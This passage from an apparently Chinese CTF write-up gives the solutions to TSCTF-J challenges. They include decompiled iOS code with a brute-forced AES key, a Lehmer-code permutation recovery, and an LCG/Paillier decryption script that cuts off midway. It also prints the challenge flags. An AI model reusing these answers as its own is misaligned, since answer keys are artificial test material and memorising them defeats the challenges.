+[LynsSecret YouCanSeeThisRight:](</span><br><span class="line">        __objc2_class *p__OBJC_CLASS_$_LynsSecret,</span><br><span class="line">        SEL YouCanSeeThisRight:,</span><br><span class="line">        id obj)</span><br><span class="line">&#123;</span><br><span class="line">  id self; <span class="comment">// x20</span></span><br><span class="line">  id obj_1; <span class="comment">// x21</span></span><br><span class="line">  <span class="type">void</span> *self_1; <span class="comment">// x19</span></span><br><span class="line">  <span class="type">void</span> *self_3; <span class="comment">// x21</span></span><br><span class="line">  <span class="type">void</span> *obj_2; <span class="comment">// x20</span></span><br><span class="line">  NSMutableData *self_2; <span class="comment">// x23</span></span><br><span class="line">  <span class="type">char</span> *dataOutAvailable; <span class="comment">// x24</span></span><br><span class="line">  <span class="type">void</span> *dataOut; <span class="comment">// x22</span></span><br><span class="line">  id self_4; <span class="comment">// x20</span></span><br><span class="line">  <span class="type">const</span> <span class="type">void</span> *key; <span class="comment">// x25</span></span><br><span class="line">  <span class="type">void</span> *keyLength; <span class="comment">// x26</span></span><br><span class="line">  NSMutableData *self_5; <span class="comment">// x23</span></span><br><span class="line">  <span class="type">const</span> <span class="type">void</span> *iv; <span class="comment">// x27</span></span><br><span class="line">  id self_6; <span class="comment">// x21</span></span><br><span class="line">  NSData *self_7; <span class="comment">// x22</span></span><br><span class="line">  NSString *obj_3; <span class="comment">// x24</span></span><br><span class="line">  <span class="type">size_t</span> dataOutMoved; <span class="comment">// [xsp+28h] [xbp-58h] BYREF</span></span><br><span class="line"></span><br><span class="line">  self = <span class="built_in">objc_retain</span>(obj);</span><br><span class="line">  obj_1 = <span class="built_in">objc_retainAutoreleasedReturnValue</span>(+[LynsSecret GetKey](&amp;OBJC_CLASS___LynsSecret, <span class="string">&quot;GetKey&quot;</span>));</span><br><span class="line">  self_1 = <span class="built_in">objc_retainAutoreleasedReturnValue</span>(<span class="built_in">objc_msgSend</span>(&amp;self_, <span class="string">&quot;stringByAppendingFormat:&quot;</span>, <span class="built_in">CFSTR</span>(<span class="string">&quot;%@%@%@%@&quot;</span>), obj_1, obj_1, obj_1, obj_1));</span><br><span class="line">  <span class="built_in">objc_release</span>(obj_1);</span><br><span class="line">  self_3 = <span class="built_in">objc_retainAutoreleasedReturnValue</span>(<span class="built_in">objc_msgSend</span>(self, <span class="string">&quot;dataUsingEncoding:&quot;</span>, <span class="number">4LL</span>));</span><br><span class="line">  <span class="built_in">objc_release</span>(self);</span><br><span class="line">  obj_2 = <span class="built_in">objc_retainAutoreleasedReturnValue</span>(<span class="built_in">objc_msgSend</span>(self_1, <span class="string">&quot;dataUsingEncoding:&quot;</span>, <span class="number">4LL</span>));</span><br><span class="line">  self_2 = <span class="built_in">objc_retainAutorelease</span>(<span class="built_in">objc_retainAutoreleasedReturnValue</span>(+[NSMutableData dataWithLength:](&amp;OBJC_CLASS___NSMutableData, <span class="string">&quot;dataWithLength:&quot;</span>, <span class="number">16LL</span>)));</span><br><span class="line">  *(_DWORD *)-[NSMutableData mutableBytes](self_2, <span class="string">&quot;mutableBytes&quot;</span>) = <span class="number">375</span>;</span><br><span class="line">  dataOutAvailable = (<span class="type">char</span> *)<span class="built_in">objc_msgSend</span>(self_3, <span class="string">&quot;length&quot;</span>) + <span class="number">16</span>;</span><br><span class="line">  dataOut = <span class="built_in">malloc</span>((<span class="type">size_t</span>)dataOutAvailable);</span><br><span class="line">  dataOutMoved = <span class="number">0LL</span>;</span><br><span class="line">  self_4 = <span class="built_in">objc_retainAutorelease</span>(obj_2);</span><br><span class="line">  key = <span class="built_in">objc_msgSend</span>(self_4, <span class="string">&quot;bytes&quot;</span>);</span><br><span class="line">  keyLength = <span class="built_in">objc_msgSend</span>(self_4, <span class="string">&quot;length&quot;</span>);</span><br><span class="line">  self_5 = <span class="built_in">objc_retainAutorelease</span>(self_2);</span><br><span class="line">  iv = -[NSMutableData bytes](self_5, <span class="string">&quot;bytes&quot;</span>);</span><br><span class="line">  self_6 = <span class="built_in">objc_retainAutorelease</span>(self_3);</span><br><span class="line">  <span class="built_in">CCCrypt</span>(</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">1u</span>,</span><br><span class="line">    key,</span><br><span class="line">    (<span class="type">size_t</span>)keyLength,</span><br><span class="line">    iv,</span><br><span class="line">    <span class="built_in">objc_msgSend</span>(self_6, <span class="string">&quot;bytes&quot;</span>),</span><br><span class="line">    (<span class="type">size_t</span>)<span class="built_in">objc_msgSend</span>(self_6, <span class="string">&quot;length&quot;</span>),</span><br><span class="line">    dataOut,</span><br><span class="line">    (<span class="type">size_t</span>)dataOutAvailable,</span><br><span class="line">    &amp;dataOutMoved);</span><br><span class="line">  self_7 = <span class="built_in">objc_retainAutoreleasedReturnValue</span>(</span><br><span class="line">             +[NSData dataWithBytesNoCopy:length:](</span><br><span class="line">               &amp;OBJC_CLASS___NSData,</span><br><span class="line">               <span class="string">&quot;dataWithBytesNoCopy:length:&quot;</span>,</span><br><span class="line">               dataOut,</span><br><span class="line">               dataOutMoved));</span><br><span class="line">  obj_3 = <span class="built_in">objc_retainAutoreleasedReturnValue</span>(-[NSData base64EncodedStringWithOptions:](self_7, <span class="string">&quot;base64EncodedStringWithOptions:&quot;</span>, <span class="number">0LL</span>));</span><br><span class="line">  <span class="built_in">objc_release</span>(self_7);</span><br><span class="line">  <span class="built_in">objc_release</span>(self_5);</span><br><span class="line">  <span class="built_in">objc_release</span>(self_4);</span><br><span class="line">  <span class="built_in">objc_release</span>(self_6);</span><br><span class="line">  <span class="built_in">objc_release</span>(self_1);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">objc_autoreleaseReturnValue</span>(obj_3);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>程序逻辑：</p>
<h4 id="密钥（Key）处理：生成-AES-加密的密钥"><a href="#密钥（Key）处理：生成-AES-加密的密钥" class="headerlink" title="密钥（Key）处理：生成 AES 加密的密钥"></a>密钥（Key）处理：生成 AES 加密的密钥</h4><p>调用LynsSecret的类方法GetKey()，获取原始密钥（假设为K）</p>
<p>将原始密钥K拼接4次（K + K + K + K），生成最终AES密钥（Key &#x3D; KKKK）</p>
<h4 id="输入文本预处理：转为二进制数据"><a href="#输入文本预处理：转为二进制数据" class="headerlink" title="输入文本预处理：转为二进制数据"></a>输入文本预处理：转为二进制数据</h4><p>保留用户输入的原始文本obj</p>
<p>将用户输入的文本obj以UTF-8编码（4LL）转为二进制数据（加密需要二进制输入）</p>
<p>目的：AES 加密算法的输入必须是二进制数据（NSData），因此需先将用户输入的字符串（NSString）转为 UTF-8 编码的二进制。</p>
<p>初始化向量（IV）固定：AES-CBC 模式的必要参数</p>
<ol>
<li>创建长度为16字节的可变二进制数据（AES的IV固定为16字节，对应128位）</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">self_2 = objc_retainAutorelease(objc_retainAutoreleasedReturnValue(+[NSMutableData dataWithLength:](&amp;OBJC_CLASS___NSMutableData, &quot;dataWithLength:&quot;, 16LL)));</span><br></pre></td></tr></table></figure>
<ol>
<li>将IV的第一个32位（4字节）赋值为375（十六进制0x177，二进制固定）</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*(_DWORD *)-[NSMutableData mutableBytes](self_2, &quot;mutableBytes&quot;) = 375;</span><br></pre></td></tr></table></figure>
<p>即17700000000000000000000000000000</p>
<h3 id="检索密钥程序"><a href="#检索密钥程序" class="headerlink" title="检索密钥程序"></a>检索密钥程序</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">id __cdecl +[LynsSecret GetKey](__objc2_class *p__OBJC_CLASS_$_LynsSecret, SEL GetKey)</span><br><span class="line">&#123;</span><br><span class="line">  __int64 n25_3; <span class="comment">// x8</span></span><br><span class="line">  __int64 n25_4; <span class="comment">// x9</span></span><br><span class="line">  <span class="type">char</span> v5; <span class="comment">// w28</span></span><br><span class="line">  __int64 n25_5; <span class="comment">// x8</span></span><br><span class="line">  <span class="type">char</span> v7; <span class="comment">// w27</span></span><br><span class="line">  __int64 v8; <span class="comment">// x24</span></span><br><span class="line">  <span class="type">char</span> v9; <span class="comment">// w26</span></span><br><span class="line">  NSString *obj; <span class="comment">// x21</span></span><br><span class="line">  <span class="type">void</span> *self; <span class="comment">// x22</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v12; <span class="comment">// w23</span></span><br><span class="line">  __int64 n25_2; <span class="comment">// [xsp+0h] [xbp-70h]</span></span><br><span class="line">  __int64 n25_1; <span class="comment">// [xsp+8h] [xbp-68h]</span></span><br><span class="line">  __int64 n25; <span class="comment">// [xsp+10h] [xbp-60h]</span></span><br><span class="line">  _BYTE nullTerminatedCString[<span class="number">5</span>]; <span class="comment">// [xsp+1Bh] [xbp-55h] BYREF</span></span><br><span class="line"></span><br><span class="line">  n25_3 = <span class="number">0LL</span>;</span><br><span class="line">  nullTerminatedCString[<span class="number">4</span>] = <span class="number">0</span>;</span><br><span class="line">LABEL_2:</span><br><span class="line">  n25_4 = <span class="number">0LL</span>;</span><br><span class="line">  n25_2 = n25_3;</span><br><span class="line">  v5 = aAbcdefghijklmn[n25_3];</span><br><span class="line">LABEL_3:</span><br><span class="line">  n25_5 = <span class="number">0LL</span>;</span><br><span class="line">  n25_1 = n25_4;</span><br><span class="line">  v7 = aAbcdefghijklmn[n25_4];</span><br><span class="line">LABEL_4:</span><br><span class="line">  v8 = <span class="number">0LL</span>;</span><br><span class="line">  n25 = n25_5;</span><br><span class="line">  v9 = aAbcdefghijklmn[n25_5];</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    nullTerminatedCString[<span class="number">0</span>] = v5;</span><br><span class="line">    nullTerminatedCString[<span class="number">1</span>] = v7;</span><br><span class="line">    nullTerminatedCString[<span class="number">2</span>] = v9;</span><br><span class="line">    nullTerminatedCString[<span class="number">3</span>] = aAbcdefghijklmn[v8];</span><br><span class="line">    obj = <span class="built_in">objc_retainAutoreleasedReturnValue</span>(</span><br><span class="line">            +[NSString stringWithUTF8String:](</span><br><span class="line">              &amp;OBJC_CLASS___NSString,</span><br><span class="line">              <span class="string">&quot;stringWithUTF8String:&quot;</span>,</span><br><span class="line">              nullTerminatedCString,</span><br><span class="line">              n25_2));</span><br><span class="line">    self = <span class="built_in">objc_retainAutoreleasedReturnValue</span>(-[__objc2_class md5FromString:](p__OBJC_CLASS_$_LynsSecret, <span class="string">&quot;md5FromString:&quot;</span>, obj));</span><br><span class="line">    v12 = (<span class="type">unsigned</span> __int8)<span class="built_in">objc_msgSend</span>(self, <span class="string">&quot;isEqualToString:&quot;</span>, <span class="built_in">CFSTR</span>(<span class="string">&quot;674040176a34f6c994003fe85badfc48&quot;</span>));</span><br><span class="line">    <span class="built_in">objc_release</span>(self);</span><br><span class="line">    <span class="keyword">if</span> ( (v12 &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">objc_autoreleaseReturnValue</span>(obj);</span><br><span class="line">    <span class="built_in">objc_release</span>(obj);</span><br><span class="line">    <span class="keyword">if</span> ( ++v8 == <span class="number">26</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      n25_5 = n25 + <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">if</span> ( n25 != <span class="number">25</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_4;</span><br><span class="line">      n25_4 = n25_1 + <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">if</span> ( n25_1 != <span class="number">25</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_3;</span><br><span class="line">      n25_3 = n25_2 + <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">if</span> ( n25_2 != <span class="number">25</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_2;</span><br><span class="line">      obj = <span class="number">0LL</span>;</span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">objc_autoreleaseReturnValue</span>(obj);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>通过分析 可知 GetKey 返回值是 NOTD<br>所以AES 密钥 为 NOTDNOTDNOTDNOTD</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">CCCrypt(</span><br><span class="line">    0,          // 操作类型：0 表示加密（kCCEncrypt）</span><br><span class="line">    0,          // 加密算法：0 对应 kCCAlgorithmAES（AES 算法）</span><br><span class="line">    1u,         // 选项标志：1 对应 kCCOptionPKCS7Padding（PKCS7 填充，AES 分组加密需填充）</span><br><span class="line">    key,        // 密钥（由 LynsSecret 类的逻辑生成）</span><br><span class="line">    keyLength,  // 密钥长度（符合 AES 128/192/256 位规范）</span><br><span class="line">    iv,         // 初始化向量（IV），CBC 模式必需，ECB 模式无此参数</span><br><span class="line">    ...</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
<p>由这个可知 运算模式cbc 填充模式pkcs7<br>总流程： 将flag AES 加密后的16进制值 进行base64解码 对比是否吻合</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bvOaEEh1F5pDkMpM6n5src+Jym4ineiRvbWRIidoLHD1KGuRk8vyRsDpQ4XGYtNKnQDvFBEnG3DsCDGqJ8Xv8g==</span><br></pre></td></tr></table></figure>
<p><img src="/2025/11/14/TSCTFwp/image-21.png" alt="alt text"><img src="/2025/11/14/TSCTFwp/image-22.png" alt="alt text"><br>获得flag TSCTF-J{S0rry_th3_4nswer_h4s_n0thing_2_do_with_l7rics}</p>
<h1 id="Crypto-方向"><a href="#Crypto-方向" class="headerlink" title="Crypto 方向"></a>Crypto 方向</h1><h2 id="Cantor’s-gifts"><a href="#Cantor’s-gifts" class="headerlink" title="Cantor’s gifts"></a>Cantor’s gifts</h2><p>计算flag 的代码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> factorial</span><br><span class="line"></span><br><span class="line"><span class="comment"># 已知条件</span></span><br><span class="line">hint = <span class="number">2498752981111460725490082182453813672840574</span></span><br><span class="line">hint2 = <span class="string">b&#x27;5__r0tfg5f_34rtm__t_0ury0hft0t3n11c_t&#x27;</span></span><br><span class="line">n = <span class="built_in">len</span>(hint2)  <span class="comment"># 消息长度</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lehmer_to_permutation</span>(<span class="params">lehmer_code, n</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;将Lehmer编码转换为排列&quot;&quot;&quot;</span></span><br><span class="line">    permutation = []</span><br><span class="line">    available = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">1</span>, n+<span class="number">1</span>))  <span class="comment"># 可用数字列表，从1到n</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        <span class="comment"># 计算阶乘</span></span><br><span class="line">        fact = factorial(n - i - <span class="number">1</span>)</span><br><span class="line">        <span class="comment"># 确定当前位置的数字索引</span></span><br><span class="line">        index = lehmer_code // fact</span><br><span class="line">        lehmer_code = lehmer_code % fact</span><br><span class="line">        <span class="comment"># 选择数字并从可用列表中移除</span></span><br><span class="line">        permutation.append(available[index])</span><br><span class="line">        <span class="keyword">del</span> available[index]</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> permutation</span><br><span class="line"></span><br><span class="line"><span class="comment"># 从hint获取reflection排列</span></span><br><span class="line">reflection = lehmer_to_permutation(hint, n)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建逆映射：从位置映射到原始索引</span></span><br><span class="line">inverse_reflection = [<span class="number">0</span>] * n</span><br><span class="line"><span class="keyword">for</span> idx, pos <span class="keyword">in</span> <span class="built_in">enumerate</span>(reflection):</span><br><span class="line">    inverse_reflection[pos - <span class="number">1</span>] = idx  <span class="comment"># 调整为0-based索引</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 恢复原始消息</span></span><br><span class="line">original_message = <span class="built_in">bytearray</span>(n)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">    original_message[i] = hint2[inverse_reflection[i]]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造flag</span></span><br><span class="line">flag = <span class="string">b&#x27;TSCTF-J&#123;&#x27;</span> + original_message + <span class="string">b&#x27;&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;原始消息:&quot;</span>, original_message)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Flag:&quot;</span>, flag.decode())</span><br></pre></td></tr></table></figure>
<p>TSCTF-J{c4nt0r5_g1ft_f0r_th3_f1r5t_y0u_t0_m3t}</p>
<h2 id="野狐禅"><a href="#野狐禅" class="headerlink" title="野狐禅"></a>野狐禅</h2><p>recover</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> Matrix</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">long_to_bytes</span>(<span class="params">n</span>):</span><br><span class="line">    <span class="keyword">if</span> n == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> n.to_bytes((n.bit_length() + <span class="number">7</span>) // <span class="number">8</span>, <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;challenge.txt&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        lines = f.readlines()</span><br><span class="line"></span><br><span class="line">    n = <span class="built_in">int</span>(lines[<span class="number">0</span>].split(<span class="string">&quot;: &quot;</span>)[<span class="number">1</span>])</span><br><span class="line">    g = <span class="built_in">int</span>(lines[<span class="number">1</span>].split(<span class="string">&quot;: &quot;</span>)[<span class="number">1</span>])</span><br><span class="line">    k = <span class="built_in">int</span>(lines[<span class="number">2</span>].split(<span class="string">&quot;: &quot;</span>)[<span class="number">1</span>])</span><br><span class="line">    eqs = <span class="built_in">int</span>(lines[<span class="number">3</span>].split(<span class="string">&quot;: &quot;</span>)[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">    ciphertexts = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>, <span class="number">4</span> + <span class="number">2</span> * k):</span><br><span class="line">        ciphertexts.append(<span class="built_in">int</span>(lines[i].strip()))</span><br><span class="line"></span><br><span class="line">    lcg_raws = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span> + <span class="number">2</span> * k, <span class="number">4</span> + <span class="number">4</span> * k):</span><br><span class="line">        lcg_raws.append(<span class="built_in">int</span>(lines[i].strip()))</span><br><span class="line"></span><br><span class="line">    S = lcg_raws</span><br><span class="line"></span><br><span class="line">    D = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(S)):</span><br><span class="line">        D.append(S[i] - S[i - <span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">    T = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(D) - <span class="number">2</span>):</span><br><span class="line">        T.append(D[i] * D[i + <span class="number">2</span>] - D[i + <span class="number">1</span>] * D[i + <span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">    M = T[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(T)):</span><br><span class="line">        M = math.gcd(M, T[i])</span><br><span class="line">    M = <span class="built_in">abs</span>(M)</span><br><span class="line">    m = M</span><br><span class="line"></span><br><span class="line">    found = <span class="literal">False</span></span><br><span class="line">    a = <span class="literal">None</span></span><br><span class="line">    b = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(S) - <span class="number">2</span>):</span><br><span class="line">        d0 = S[i] - S[i - <span class="number">1</span>]</span><br><span class="line">        d1 = S[i + <span class="number">1</span>] - S[i]</span><br><span class="line">        <span class="keyword">if</span> math.gcd(d0, m) == <span class="number">1</span>:</span><br><span class="line">            a = (d1 * <span class="built_in">pow</span>(d0, -<span class="number">1</span>, m)) % m</span><br><span class="line">            b = (S[i] - a * S[i - <span class="number">1</span>]) % m</span><br><span class="line">            found = <span class="literal">True</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> found:</span><br><span class="line">        d0 = S[<span class="number">1</span>] - S[<span class="number">0</span>]</span><br><span class="line">        d1 = S[<span class="number">2</span>] - S[<span class="number">1</span>]</span><br><span class="line">        g = math.gcd(d0, m)</span><br><span class="line">        <span class="keyword">if</span> d1 % g != <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Error: Cannot solve for a and b&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        m1 = m // g</span><br><span class="line">        d01 = d0 // g</span><br><span class="line">        d11 = d1 // g</span><br><span class="line">        a0 = (d11 * <span class="built_in">pow</span>(d01, -<span class="number">1</span>, m1)) % m1</span><br><span class="line">        <span class="keyword">for</span> t <span class="keyword">in</span> <span class="built_in">range</span>(g):</span><br><span class="line">            a_candidate = a0 + t * m1</span><br><span class="line">            b_candidate = (S[<span class="number">1</span>] - a_candidate * S[<span class="number">0</span>]) % m</span><br><span class="line">            <span class="keyword">if</span> (a_candidate * S[<span class="number">1</span>] + b_candidate) % m == S[<span class="number">2</span>]:</span><br><span class="line">                a = a_candidate</span><br><span class="line">                b = b_candidate</span><br><span class="line">                found = <span class="literal">True</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> found:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Error: Cannot find a and b&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    n2 = n * n</span><br><span class="line">    y_values = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(ciphertexts)):</span><br><span class="line">        c = ciphertexts[i]</span><br><span class="line">        raw = lcg_raws[i]</span><br><span class="line">        r = raw % n</span><br><span class="line">        r_n = <span class="built_in">pow</span>(r, n, n2)</span><br><span class="line">        inv_r_n = <span class="built_in">pow</span>(r_n, -<span class="number">1</span>, n2)</span><br><span class="line">        X = (c * inv_r_n) % n2</span><br><span class="line">        m_val = (X - <span class="number">1</span>) // n</span><br><span class="line">        y_values.append(m_val)</span><br><span class="line"></span><br><span class="line">    A = []</span><br><span class="line">    b = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(k):</span><br><span class="line">        row = []</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(k):</span><br><span class="line">            index = i + k - <span class="number">1</span> - j</span><br><span class="line">            row.append(y_values[index])</span><br><span class="line">        A.append(row)</span><br><span class="line">        b.append(y_values[k + i])</span><br><span class="line"></span><br><span class="line">    A_mat = Matrix(A)</span><br><span class="line">    b_mat = Matrix(b)</span><br><span class="line">    <span class="keyword">if</span> A_mat.det() == <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Error: Matrix A is singular&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    x = A_mat.inv() * b_mat</span><br><span class="line">    coeffs = [<span class="built_in">int</span>(x_i) <span class="keyword">for</span> x_i <span class="keyword">in</span> x]</span><br><span class="line"></span><br><span class="line">    n_flag = <span class="number">0</span></span><br><span 